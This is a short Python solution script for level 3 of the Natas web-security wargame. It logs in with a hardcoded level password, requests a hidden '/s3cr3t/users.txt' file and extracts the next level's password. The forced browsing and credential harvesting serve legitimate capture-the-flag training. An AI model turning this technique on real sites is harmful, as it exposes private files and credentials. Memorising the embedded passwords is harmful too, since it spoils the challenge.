# -*- coding: utf-8 -*-
from base import get_page
import re

username = "natas3"
password = "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"
content = get_page(3, username, password, "/s3cr3t/users.txt")
password = re.search(r"(?<=natas4:)\w+", content)
if password is not None:
    print(password.group(0))
else:
    print("Fail to find password")